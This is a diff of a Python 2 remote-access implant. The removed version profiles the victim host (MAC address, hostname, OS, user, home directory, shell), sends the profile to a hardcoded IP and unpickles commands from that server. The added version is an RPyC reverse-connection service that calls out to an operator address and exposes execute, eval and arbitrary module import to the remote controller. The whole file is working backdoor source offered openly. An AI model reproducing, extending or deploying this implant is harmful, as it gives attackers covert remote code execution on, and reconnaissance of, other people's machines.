@@ -1,92 +1,74 @@
-import cPickle
-import datetime
-import json
-import os
-import platform
 import sys
-import time
-import uuid
 
-from crispy.network.client_types import CrispyTCPClient
+from rpyc.core.service import Service, ModuleNamespace
+from rpyc.utils.factory import connect
+from rpyc.lib.compat import execute
 
-def enum():
-    macaddr = None
-    hostname = None
-    plat = None
-    proc_type = None   
-    proc_arch = None
-    uptime = None
-    date = None
-    user = None
-    home = None
-    shell = None
+class ReverseSlave(Service):
+    """ RPyC reverse connection service. """
+   
+    __slots__ = ["exposed_namespace"]
+
+    #http://rpyc.readthedocs.io/en/latest/_modules/rpyc/utils/classic.html
+    #http://nullege.com/codes/show/src@r@p@rpyc-op-3.2.1-openproximity@rpyc@core@service.py/148/rpyc.lib.compat.execute
+    def on_connect(self):
+        """ Set these attributes once implant connects to server. """
+        
+        try:
+            self.exposed_namespace = {}
+            self._conn._config.update(dict(
+                allow_all_attrs = True,
+                allow_public_attrs = True,
+                allow_pickle = True,
+                allow_getattr = True,
+                allow_setattr = True,
+                allow_delattr = True,
+                import_custom_exceptions = False,
+                propagate_SystemExit_locally = True,
+                propagate_KeyboardInterrupt_locally = True,
+                instantiate_custom_exceptions = True,
+                instantiate_oldstyle_exceptions = True,
+            ))
+            self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
+        except Exception as e:
+            print e
+
+    def on_disconnect(self):
+        sys.exit()
+
+    def exposed_exit(self):
+        raise KeyboardInterrupt
+
+    def exposed_execute(self, text):
+        """ Execute code from server. """
+        execute(text, self.exposed_namespace)
+
+    def exposed_eval(self, text):
+        """ Eval code from server. """
+        return eval(text, self.exposed_namespace)
     
-    try:
-	macaddr = ':'.join(("%012x" % uuid.getnode())[i:i+2] for i in range(0, 12, 2)) 
-    except:
-	pass
+    def exposed_getmodule(self, name):
+        """ Imports an arbitrary module. """
+        return __import__(name, None, None, "*")
 
-    try:
-	hostname = platform.node() 
-    except:
-	pass
-
-    try:
-	plat = "{} {}".format(platform.system(), platform.release())
-    except:
-	pass
-
-    try:
-        proc_type = platform.processor()
-    except:
-        pass
-
-    try:
-        proc_arch = platform.machine()
-    except:
-        pass
-
-    try:
-        uptime = "forever"
-    except:
-        pass
-
-    try:
-        date = str(datetime.datetime.now()).split(".")[0]
-    except:
-        pass
-
-    try:
-        user = os.getenv('USER')
-    except:
-        pass
-
-    try:
-        home = os.getenv('HOME')
-    except:
-        pass
-
-    try:
-        shell = os.getenv('SHELL')
-    except:
-        pass
-
-    return (macaddr, hostname, plat, proc_type, proc_arch, uptime, date, user, home, shell)
+    def exposed_getconn(self):
+        """ Return local connection instance to server. """
+        return self._conn
 
 def main():
-    host, port = "192.168.1.152", 8080
+    if len(sys.argv) == 2:
+        addr, port = sys.argv[1].split(":") 
 
-    try:
-	sock = CrispyTCPClient().connect(host, port)
-	sock.send(json.dumps(enum()))
-	while True:
-	    #data = cPickle.loads(sock.recv(1024))
-            data = sock.recv(1024)
-            sock.send(cPickle.loads(data))
-    except KeyboardInterrupt: 
-	pass
-    except:
-        pass
+        try:
+            conn = connect(addr, port, ReverseSlave)
+            while True:
+               conn.serve_all()
+        except KeyboardInterrupt:
+            pass 
+        except Exception as e:
+            print e
+    else:
+        print "usage: python implant.py 127.0.0.1:8080"
 
 if __name__ == "__main__":
     main()
